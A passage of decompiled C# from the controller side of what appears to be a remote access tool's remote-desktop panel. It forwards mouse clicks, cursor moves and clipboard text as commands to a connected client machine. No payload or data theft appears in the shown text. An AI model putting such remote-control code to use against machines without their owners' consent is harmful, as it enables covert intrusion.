				bool flag2 = e.Button == MouseButtons.Left;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"LeftDown",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				bool flag3 = e.Button == MouseButtons.Right;
				if (flag3)
				{
					byte[] state2 = Helper.SB(string.Concat(new string[]
					{
						"RightDown",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x060002A8 RID: 680 RVA: 0x000190BC File Offset: 0x000172BC
		private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"MoveCursor",
					SettingsHelper.SPL,
					point.X.ToString(),
					SettingsHelper.SPL,
					point.Y.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060002A9 RID: 681 RVA: 0x000191D0 File Offset: 0x000173D0
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
				bool flag2 = e.Button == MouseButtons.Left;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"LeftUp",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				bool flag3 = e.Button == MouseButtons.Right;
				if (flag3)
				{
					byte[] state2 = Helper.SB(string.Concat(new string[]
					{
						"RightUp",
						SettingsHelper.SPL,
						point.X.ToString(),
						SettingsHelper.SPL,
						point.Y.ToString()
					}));
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x060002AA RID: 682 RVA: 0x00019388 File Offset: 0x00017588
		private void Guna2GradientButton5_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("paste" + SettingsHelper.SPL + Convert.ToBase64String(Encoding.UTF8.GetBytes(Clipboard.GetText())));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060002AB RID: 683 RVA: 0x00019404 File Offset: 0x00017604
		private void ListView1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.ListView1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.ListView1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x04000116 RID: 278
		public Client C;

		// Token: 0x04000117 RID: 279
		public int FPS;

		// Token: 0x04000118 RID: 280
		public Stopwatch sw;

		// Token: 0x04000119 RID: 281
		public Size rdSize;
	}
}
